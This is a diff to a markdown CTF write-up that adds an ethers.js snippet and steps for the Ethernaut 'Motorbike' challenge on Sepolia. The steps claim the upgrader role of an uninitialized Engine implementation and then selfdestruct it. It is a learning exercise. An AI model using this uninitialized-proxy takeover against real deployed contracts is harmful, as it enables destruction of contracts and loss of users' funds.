@@ -383,6 +383,7 @@ The learning is that even though the called contract is restricted to be a view 
   Execute the following:
 
   ```ts
+  let iface = new _ethers.utils.Interface(proxyAbi);
   let depositSel = iface.encodeFunctionData("deposit");
   // depositSel becomes '0xd0e30db0'
 
@@ -401,3 +402,41 @@ The learning is that even though the called contract is restricted to be a view 
   let playerBN = _ethers.BigNumber.from(player);
   await contract.setMaxBalance(playerBN);
   ```
+
+## Problem 25: Motorbike
+
+- Motorbike contract: [0xe466f99614C4641b858675DAd573dC84BE565D9a](https://eth-sepolia.blockscout.com/address/0xe466f99614C4641b858675DAd573dC84BE565D9a)
+
+- Engine contract: [0xffe5af570904094b7fbcd10a8221a1d46abef4ff](https://sepolia.etherscan.io/address/0xffe5af570904094b7fbcd10a8221a1d46abef4ff)
+
+- DestroyMotorbikeEngine: [0x4D6e5e7231bE1a81C6B5d3C0504AAC199a6b1E86](https://eth-sepolia.blockscout.com/address/0x4D6e5e7231bE1a81C6B5d3C0504AAC199a6b1E86)
+
+```ts
+let provider = new _ethers.providers.Web3Provider(window.ethereum);
+let signer = provider.getSigner();
+
+let engineABI = [
+  "function upgrader() view returns (address)",
+  "function horsePower() view returns (uint256)",
+  "function initialize()",
+  "function upgradeToAndCall(address, bytes)",
+]
+
+let engineAddr = "0xffe5af570904094b7fbcd10a8221a1d46abef4ff"
+let engineContract = new _ethers.Contract(engineAddr, engineABI, signer);
+
+let destroyABI = [
+  "function destroyContract()",
+]
+
+let destroyContract = new _ethers.Contract(engineAddr, destroyABI, signer);
+```
+
+**Solution**
+
+- Note the Engine is not initialized yet.
+- Call `initialize()` and claim the upgrader.
+- Then deploy a simple smart contract that call `selfdestruct(msg.sender)`.
+- Call that function.
+
+But this solution no longer work after Dencun EVM upgrade (on Mar 2024).
